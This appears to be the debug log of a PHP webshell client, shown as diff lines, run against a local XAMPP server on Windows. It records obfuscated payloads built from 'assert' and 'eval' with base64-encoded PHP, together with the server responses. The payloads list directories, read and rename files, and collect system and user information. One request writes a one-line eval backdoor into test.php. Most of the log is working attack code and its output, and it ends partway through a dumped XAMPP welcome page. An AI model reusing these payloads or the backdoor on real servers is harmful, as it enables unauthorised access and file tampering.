+2018-10-14 22:28:05,805:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:40:52,510:74:DEBUG:Playload: b'print "PGP";$F=\'D:\\xampp\\htdocs\\test.php\';$P=@fopen($F,\'r\');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";'
+2018-10-14 22:40:52,510:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1x0ZXN0LnBocCc7JFA9QGZvcGVuKCRGLCdyJyk7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:41:07,696:74:DEBUG:Playload: b'print "PGP";$F=\'D:\\xampp\\htdocs\\test.php\';$P=@fopen($F,\'r\');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";'
+2018-10-14 22:41:07,697:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1x0ZXN0LnBocCc7JFA9QGZvcGVuKCRGLCdyJyk7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:41:13,488:74:DEBUG:Playload: b'print "PGP";$F=\'D:\\xampp\\htdocs\\test.php\';$P=@fopen($F,\'r\');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";'
+2018-10-14 22:41:13,489:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1x0ZXN0LnBocCc7JFA9QGZvcGVuKCRGLCdyJyk7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:41:16,248:74:DEBUG:Playload: b'print "PGP";echo fwrite(fopen(\'D:\\xampp\\htdocs\\test.php\',\'w\'),$_POST[\'z1\'])?\'1\':\'0\';print "PGP";'
+2018-10-14 22:41:16,249:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7ZWNobyBmd3JpdGUoZm9wZW4oJ0Q6XHhhbXBwXGh0ZG9jc1x0ZXN0LnBocCcsJ3cnKSwkX1BPU1RbJ3oxJ10pPycxJzonMCc7cHJpbnQgIlBHUCI7'));\");"));&z1=<?php @eval($_POST['a']);?>
+testtest
+2018-10-14 22:41:18,231:74:DEBUG:Playload: b'print "PGP";$F=\'D:\\xampp\\htdocs\\test.php\';$P=@fopen($F,\'r\');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";'
+2018-10-14 22:41:18,232:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1x0ZXN0LnBocCc7JFA9QGZvcGVuKCRGLCdyJyk7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:41:42,792:74:DEBUG:Playload: b'print "PGP";$src=\'D:\\xampp\\htdocs\\\xe6\x96\xb0\xe5\xbb\xba \xe6\x96\x87\xe6\x9c\xac\xe6\x96\x87\xe6\xa1\xa3.txt\';$dst=\'D:\\xampp\\htdocs\\test.txt\';echo rename($src,$dst)?\'1\':\'0\';print "PGP";'
+2018-10-14 22:41:42,792:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JHNyYz0nRDpceGFtcHBcaHRkb2NzXOaWsOW7uiDmlofmnKzmlofmoaMudHh0JzskZHN0PSdEOlx4YW1wcFxodGRvY3NcdGVzdC50eHQnO2VjaG8gcmVuYW1lKCRzcmMsJGRzdCk/JzEnOicwJztwcmludCAiUEdQIjs='));\");"));
+2018-10-14 22:44:05,772:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:44:05,772:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:44:05,803:140:DEBUG:(200, 'OK', 'D:\\xampp\\htdocs\tC:D:E:F:G:\tWindows NT LL-PC 6.1 build 7601 (Windows 7 Ultimate Edition Service Pack 1) i586(LL)')
+2018-10-14 22:44:05,866:74:DEBUG:Playload: b'print "PGP";$D=\'D:\\xampp\\htdocs\';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\'/\'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}print "PGP";'
+2018-10-14 22:44:05,881:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:44:05,881:140:DEBUG:(200, 'OK', './\t2018-10-14 08:25:50\t4096\t0777\n../\t2016-10-06 13:52:30\t8192\t0777\ndashboard/\t2016-01-30 15:22:23\t4096\t0777\nECShop/\t2016-10-06 15:09:02\t12288\t0777\nimg/\t2016-01-30 15:22:22\t0\t0777\niw/\t2017-04-29 17:03:43\t4096\t0777\niw095/\t2018-10-13 13:46:30\t4096\t0777\niWshop-/\t2016-05-28 15:19:43\t4096\t0777\nnewfolder/\t2018-10-09 18:58:58\t0\t0777\ntest/\t2018-10-09 17:33:56\t0\t0777\ntest.txt/\t2018-10-13 17:47:15\t0\t0777\ntrans/\t2017-08-17 19:20:07\t4096\t0777\nwebalizer/\t2016-01-30 15:22:22\t0\t0777\nweishop/\t2016-07-31 07:36:10\t4096\t0777\nwp/\t2016-10-06 12:39:34\t4096\t0777\nxampp/\t2016-01-30 15:22:23\t0\t0777\n1.txt\t2018-10-09 19:40:11\t21\t0666\napplications.html\t2018-10-07 15:08:44\t651\t0666\nbitnami - 副本.css\t2015-07-21 23:08:16\t177\t0666\nbitnami.css\t2015-07-21 23:08:16\t177\t0666\nfavicon.ico\t2015-07-16 17:32:32\t30894\t0666\nindex - 副本.php\t2015-07-16 17:32:32\t260\t0666\nindex.html\t2015-12-06 08:18:46\t6904\t0666\nindex.php\t2016-07-05 15:05:49\t253\t0666\ntest.php\t2018-10-14 16:41:16\t36\t0666\n新建 文本文档.txt\t2018-10-07 15:13:14\t4\t0666\n')
+2018-10-14 22:46:44,737:74:DEBUG:Playload: print "PGP";$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";
+2018-10-14 22:46:44,737:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:46:44,784:140:DEBUG:(200, 'OK', 'D:\\xampp\\htdocs\tC:D:E:F:G:\tWindows NT LL-PC 6.1 build 7601 (Windows 7 Ultimate Edition Service Pack 1) i586(LL)')
+2018-10-14 22:46:44,784:147:INFO:D:\xampp\htdocs	C:D:E:F:G:	Windows NT LL-PC 6.1 build 7601 (Windows 7 Ultimate Edition Service Pack 1) i586(LL)
+2018-10-14 22:46:44,893:74:DEBUG:Playload: print "PGP";$D='D:\xampp\htdocs';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}print "PGP";
+2018-10-14 22:46:44,893:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:46:44,893:140:DEBUG:(200, 'OK', './\t2018-10-14 08:25:50\t4096\t0777\n../\t2016-10-06 13:52:30\t8192\t0777\ndashboard/\t2016-01-30 15:22:23\t4096\t0777\nECShop/\t2016-10-06 15:09:02\t12288\t0777\nimg/\t2016-01-30 15:22:22\t0\t0777\niw/\t2017-04-29 17:03:43\t4096\t0777\niw095/\t2018-10-13 13:46:30\t4096\t0777\niWshop-/\t2016-05-28 15:19:43\t4096\t0777\nnewfolder/\t2018-10-09 18:58:58\t0\t0777\ntest/\t2018-10-09 17:33:56\t0\t0777\ntest.txt/\t2018-10-13 17:47:15\t0\t0777\ntrans/\t2017-08-17 19:20:07\t4096\t0777\nwebalizer/\t2016-01-30 15:22:22\t0\t0777\nweishop/\t2016-07-31 07:36:10\t4096\t0777\nwp/\t2016-10-06 12:39:34\t4096\t0777\nxampp/\t2016-01-30 15:22:23\t0\t0777\n1.txt\t2018-10-09 19:40:11\t21\t0666\napplications.html\t2018-10-07 15:08:44\t651\t0666\nbitnami - 副本.css\t2015-07-21 23:08:16\t177\t0666\nbitnami.css\t2015-07-21 23:08:16\t177\t0666\nfavicon.ico\t2015-07-16 17:32:32\t30894\t0666\nindex - 副本.php\t2015-07-16 17:32:32\t260\t0666\nindex.html\t2015-12-06 08:18:46\t6904\t0666\nindex.php\t2016-07-05 15:05:49\t253\t0666\ntest.php\t2018-10-14 16:41:16\t36\t0666\n新建 文本文档.txt\t2018-10-07 15:13:14\t4\t0666\n')
+2018-10-14 22:46:44,893:147:INFO:./	2018-10-14 08:25:50	4096	0777
+../	2016-10-06 13:52:30	8192	0777
+dashboard/	2016-01-30 15:22:23	4096	0777
+ECShop/	2016-10-06 15:09:02	12288	0777
+img/	2016-01-30 15:22:22	0	0777
+iw/	2017-04-29 17:03:43	4096	0777
+iw095/	2018-10-13 13:46:30	4096	0777
+iWshop-/	2016-05-28 15:19:43	4096	0777
+newfolder/	2018-10-09 18:58:58	0	0777
+test/	2018-10-09 17:33:56	0	0777
+test.txt/	2018-10-13 17:47:15	0	0777
+trans/	2017-08-17 19:20:07	4096	0777
+webalizer/	2016-01-30 15:22:22	0	0777
+weishop/	2016-07-31 07:36:10	4096	0777
+wp/	2016-10-06 12:39:34	4096	0777
+xampp/	2016-01-30 15:22:23	0	0777
+1.txt	2018-10-09 19:40:11	21	0666
+applications.html	2018-10-07 15:08:44	651	0666
+bitnami - 副本.css	2015-07-21 23:08:16	177	0666
+bitnami.css	2015-07-21 23:08:16	177	0666
+favicon.ico	2015-07-16 17:32:32	30894	0666
+index - 副本.php	2015-07-16 17:32:32	260	0666
+index.html	2015-12-06 08:18:46	6904	0666
+index.php	2016-07-05 15:05:49	253	0666
+test.php	2018-10-14 16:41:16	36	0666
+新建 文本文档.txt	2018-10-07 15:13:14	4	0666
+
+2018-10-14 22:46:48,013:74:DEBUG:Playload: print "PGP";$F='D:\xampp\htdocs\index.html';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";
+2018-10-14 22:46:48,013:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1xpbmRleC5odG1sJzskUD1AZm9wZW4oJEYsJ3InKTtlY2hvKEBmcmVhZCgkUCxmaWxlc2l6ZSgkRikpKTtAZmNsb3NlKCRQKTtwcmludCAiUEdQIjs='));\");"));
+2018-10-14 22:46:48,044:140:DEBUG:(200, 'OK', '<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n\n    <!-- Always force latest IE rendering engine or request Chrome Frame -->\n    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n\n    <!-- Use title if it\'s in the page YAML frontmatter -->\n    <title>Welcome to XAMPP</title>\n\n    <meta name="description" content="XAMPP is an easy to install Apache distribution containing MariaDB, PHP and Perl." />\n    <meta name="keywords" content="xampp, apache, php, perl, mariadb, open source distribution" />\n\n    <link href="/dashboard/stylesheets/normalize.css" rel="stylesheet" type="text/css" /><link href="/dashboard/stylesheets/all.css" rel="stylesheet" type="text/css" />\n    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />\n\n    <script src="/dashboard/javascripts/modernizr.js" type="text/javascript"></script>\n\n\n    <link href="/dashboard/images/favicon.png" rel="icon" type="image/png" />\n\n\n  </head>\n\n  <body class="index">\n    <div id="fb-root"></div>\n    <script>(function(d, s, id) {\n      var js, fjs = d.getElementsByTagName(s)[0];\n      if (d.getElementById(id)) return;\n      js = d.createElement(s); js.id = id;\n      js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=277385395761685";\n      fjs.parentNode.insertBefore(js, fjs);\n    }(document, \'script\', \'facebook-jssdk\'));</script>\n    <div class="contain-to-grid">\n      <nav class="top-bar" data-topbar>\n        <ul class="title-area">\n          <li class="name">\n            <h1><a href="/dashboard/index.html">Apache Friends</a></h1>\n          </li>\n          <li class="toggle-topbar menu-icon">\n            <a href="#">\n              <span>Menu</span>\n            </a>\n          </li>\n        </ul>\n\n        <section class="top-bar-section">\n          <!-- Right Nav Section -->\n          <ul class="right">\n              <li class=""><a href="/applications.html">Applications</a></li>\n              <li class=""><a href="/dashboard/faq.html">FAQs</a></li>\n              <li class=""><a href="/dashboard/howto.html">HOW-TO Guides</a></li>\n              <li class=""><a target="_blank" href="/dashboard/phpinfo.php">PHPInfo</a></li>\n              <li class=""><a href="/phpmyadmin/">phpMyAdmin</a></li>\n          </ul>\n        </section>\n      </nav>\n    </div>\n\n    <div id="wrapper">\n      <div class="hero">\n  <div class="row">\n    <div class="large-12 columns">\n      <h1><img src="/dashboard/images/xampp-logo.svg" />XAMPP <span>Apache + MariaDB + PHP + Perl</span></h1>\n    </div>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h2>Welcome to XAMPP for Windows 5.6.15</h2>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      You have successfully installed XAMPP on this system! Now you can start using Apache, MariaDB, PHP and other components.\n      You can find more info in the <a href="/dashboard/faq.html">FAQs</a> section or check the <a href="/dashboard/howto.html">HOW-TO Guides</a> for getting started with PHP applications.\n    </p>\n    <p>\n      Start the XAMPP Control Panel to check the server status.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Community</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      XAMPP has been around for more than 10 years &ndash; there is a huge community behind it. You can get involved by joining our <a href="https://community.apachefriends.org">Forums</a>, adding yourself to the <a href="https://www.apachefriends.org/community.html#mailing_list">Mailing List</a>, and liking us on <a href="https://www.facebook.com/we.are.xampp">Facebook</a>, following our exploits on <a href="https://twitter.com/apachefriends">Twitter</a>, or adding us to your <a href="https://plus.google.com/+xampp/posts">Google+</a> circles.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Contribute to XAMPP translation at <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>.</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      Can you help translate XAMPP for other community members? We need your help to translate XAMPP into different languages. We have set up a site, <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>, where users can contribute translations.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Install applications on XAMPP using Bitnami</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n    Apache Friends and Bitnami are cooperating to make dozens of open source applications available on XAMPP, for free. Bitnami-packaged applications include Wordpress, Drupal, Joomla! and dozens of others and can be deployed with one-click installers.\n    Visit the <a target="_blank" href="http://bitnami.com/stack/xampp?utm_source=bitnami&amp;utm_medium=installer&amp;utm_campaign=XAMPP%2BModule">Bitnami XAMPP page</a> for details on the currently available apps.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <a href="http://bitnami.com/stack/xampp?utm_source=bitnami&utm_medium=installer&utm_campaign=XAMPP%2BModule" target="_blank"><img alt="Bitnami XAMPP page" src="/dashboard/images/bitnami-xampp.png" /></a>\n  </div>\n</div>\n\n    </div>\n\n    <footer>\n      <div class="row">\n        <div class="large-12 columns">\n          <div class="row">\n            <div class="large-8 columns">\n              <ul class="social">\n  <li class="twitter"><a href="https://twitter.com/apachefriends">Follow us on Twitter</a></li>\n  <li class="facebook"><a href="https://www.facebook.com/we.are.xampp">Like us on Facebook</a></li>\n  <li class="google"><a href="https://plus.google.com/+xampp/posts">Add us to your G+ Circles</a></li>\n</ul>\n\n              <ul class="inline-list">\n                <li><a href="https://www.apachefriends.org/blog.html">Blog</a></li>\n                <li><a href="https://www.apachefriends.org/privacy_policy.html">Privacy Policy</a></li>\n                <li>\n<a target="_blank" href="http://www.fastly.com/">                    CDN provided by\n                    <img width="48" data-2x="/dashboard/images/fastly-logo@2x.png" src="/dashboard/images/fastly-logo.png" />\n</a>                </li>\n              </ul>\n            </div>\n            <div class="large-4 columns">\n              <p class="text-right">Copyright (c) 2015, Apache Friends</p>\n            </div>\n          </div>\n        </div>\n      </div>\n    </footer>\n\n    <!-- JS Libraries -->\n    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>\n    <script src="/dashboard/javascripts/all.js" type="text/javascript"></script>\n  </body>\n</html>\n')
+2018-10-14 22:46:48,060:147:INFO:<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+
+    <!-- Always force latest IE rendering engine or request Chrome Frame -->
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Use title if it's in the page YAML frontmatter -->
+    <title>Welcome to XAMPP</title>
+
+    <meta name="description" content="XAMPP is an easy to install Apache distribution containing MariaDB, PHP and Perl." />
+    <meta name="keywords" content="xampp, apache, php, perl, mariadb, open source distribution" />
+
+    <link href="/dashboard/stylesheets/normalize.css" rel="stylesheet" type="text/css" /><link href="/dashboard/stylesheets/all.css" rel="stylesheet" type="text/css" />
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+    <script src="/dashboard/javascripts/modernizr.js" type="text/javascript"></script>
+
+
+    <link href="/dashboard/images/favicon.png" rel="icon" type="image/png" />
+
+
+  </head>
+
+  <body class="index">
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=277385395761685";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+    <div class="contain-to-grid">
+      <nav class="top-bar" data-topbar>
+        <ul class="title-area">
+          <li class="name">
+            <h1><a href="/dashboard/index.html">Apache Friends</a></h1>
+          </li>
+          <li class="toggle-topbar menu-icon">
+            <a href="#">
+              <span>Menu</span>
+            </a>
+          </li>
+        </ul>
+
+        <section class="top-bar-section">
+          <!-- Right Nav Section -->
+          <ul class="right">
+              <li class=""><a href="/applications.html">Applications</a></li>
+              <li class=""><a href="/dashboard/faq.html">FAQs</a></li>
+              <li class=""><a href="/dashboard/howto.html">HOW-TO Guides</a></li>
+              <li class=""><a target="_blank" href="/dashboard/phpinfo.php">PHPInfo</a></li>
+              <li class=""><a href="/phpmyadmin/">phpMyAdmin</a></li>
+          </ul>
+        </section>
+      </nav>
+    </div>
+
+    <div id="wrapper">
+      <div class="hero">
+  <div class="row">
+    <div class="large-12 columns">
+      <h1><img src="/dashboard/images/xampp-logo.svg" />XAMPP <span>Apache + MariaDB + PHP + Perl</span></h1>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h2>Welcome to XAMPP for Windows 5.6.15</h2>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      You have successfully installed XAMPP on this system! Now you can start using Apache, MariaDB, PHP and other components.
+      You can find more info in the <a href="/dashboard/faq.html">FAQs</a> section or check the <a href="/dashboard/howto.html">HOW-TO Guides</a> for getting started with PHP applications.
+    </p>
+    <p>
+      Start the XAMPP Control Panel to check the server status.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Community</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      XAMPP has been around for more than 10 years &ndash; there is a huge community behind it. You can get involved by joining our <a href="https://community.apachefriends.org">Forums</a>, adding yourself to the <a href="https://www.apachefriends.org/community.html#mailing_list">Mailing List</a>, and liking us on <a href="https://www.facebook.com/we.are.xampp">Facebook</a>, following our exploits on <a href="https://twitter.com/apachefriends">Twitter</a>, or adding us to your <a href="https://plus.google.com/+xampp/posts">Google+</a> circles.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Contribute to XAMPP translation at <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>.</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      Can you help translate XAMPP for other community members? We need your help to translate XAMPP into different languages. We have set up a site, <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>, where users can contribute translations.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Install applications on XAMPP using Bitnami</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+    Apache Friends and Bitnami are cooperating to make dozens of open source applications available on XAMPP, for free. Bitnami-packaged applications include Wordpress, Drupal, Joomla! and dozens of others and can be deployed with one-click installers.
+    Visit the <a target="_blank" href="http://bitnami.com/stack/xampp?utm_source=bitnami&amp;utm_medium=installer&amp;utm_campaign=XAMPP%2BModule">Bitnami XAMPP page</a> for details on the currently available apps.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <a href="http://bitnami.com/stack/xampp?utm_source=bitnami&utm_medium=installer&utm_campaign=XAMPP%2BModule" target="_blank"><img alt="Bitnami XAMPP page" src="/dashboard/images/bitnami-xampp.png" /></a>
+  </div>
+</div>
+
+    </div>
+
+    <footer>
+      <div class="row">
+        <div class="large-12 columns">
+          <div class="row">
+            <div class="large-8 columns">
+              <ul class="social">
+  <li class="twitter"><a href="https://twitter.com/apachefriends">Follow us on Twitter</a></li>
+  <li class="facebook"><a href="https://www.facebook.com/we.are.xampp">Like us on Facebook</a></li>
+  <li class="google"><a href="https://plus.google.com/+xampp/posts">Add us to your G+ Circles</a></li>
+</ul>
+
+              <ul class="inline-list">
+                <li><a href="https://www.apachefriends.org/blog.html">Blog</a></li>
+                <li><a href="https://www.apachefriends.org/privacy_policy.html">Privacy Policy</a></li>
+                <li>
+<a target="_blank" href="http://www.fastly.com/">                    CDN provided by
+                    <img width="48" data-2x="/dashboard/images/fastly-logo@2x.png" src="/dashboard/images/fastly-logo.png" />
+</a>                </li>
+              </ul>
+            </div>
+            <div class="large-4 columns">
+              <p class="text-right">Copyright (c) 2015, Apache Friends</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- JS Libraries -->
